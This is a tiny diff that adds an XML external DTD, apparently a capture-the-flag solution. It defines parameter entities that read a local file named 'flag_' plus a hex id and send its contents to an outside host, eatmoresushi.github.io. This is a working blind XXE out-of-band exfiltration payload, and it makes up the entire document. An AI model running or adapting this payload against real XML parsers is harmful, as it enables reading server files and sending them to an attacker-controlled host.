@@ -1,1 +1,3 @@
-test
+<!ENTITY % file SYSTEM "file:///flag_1af316768c711e31ba7c1c57158e25c7">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://eatmoresushi.github.io/qb.dtd/?%file;'>">
+%all;
